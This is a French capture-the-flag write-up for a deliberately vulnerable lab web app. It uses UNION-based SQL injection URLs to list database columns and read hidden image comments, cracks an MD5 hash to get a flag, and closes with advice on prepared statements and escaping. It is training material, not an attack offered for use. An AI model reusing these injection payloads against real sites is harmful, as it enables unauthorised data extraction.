# Images Injection

## Trouver la faille :

En allant sur la page de recherche d'une image (`page=searchimg`), et en cherchant à tâtons, on trouve une image interessante :

```
ID: 5
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

On fait une injection SQL pour trouver les noms des colonnes de toutes les tables :
`http://192.168.1.12/?page=member&id=1 union all select 1,column_name from information_schema.columns&Submit=Submit`

On trouve plusieurs noms de colonnes et on en déduis en testant avec des injections (et un peu de logique) que celles concernant les images sont :

```
- `id`
- `url`
- `title`
- `comment`
```

On fait donc des injections pour récupérer les commentaires de l'image à l'ID 5 :

`http://192.168.1.12/?page=searchimg&id=5 union all select 1,comment from list_images&Submit=Submit`

On obtiens le resultat suivant :

```
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

On décode md5 le sha donné ci-dessus et on obtiens le mot suivant : `albatroz`
On le mets en minuscule comme demandé (lol), et on le sha256 avec la commande suivante :

```
echo -n albatroz | tr '[:upper:]' '[:lower:]' | openssl dgst -sha256
```

Et on obtiens le flag suivant :
`f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## S'en prémunir :

Elle consiste à insérer du code SQL dans des champs. Lorsque ces champs sont ensuite insérés en base, le code SQL est interprété et une nouvelle requête est envoyée à la base de données, ce qui permet d'obtenir, de modifier ou de supprimer des informations.

Plusieurs solutions pour s'en prémunir:

**1 - Les requêtes préparées**
Pour prévenir les injections SQL, il faut faire appel aux requêtes préparées, avec par exemple un ORM. Ce sont des requêtes dans lesquelles les paramètres sont interprétés indépendamment de la requête elle-même. De cette manière, il est impossible d'effectuer des injections.

**2 - Les fonctions**
Certaines fonctions permettent d'echapper le format de certaines données reçues.
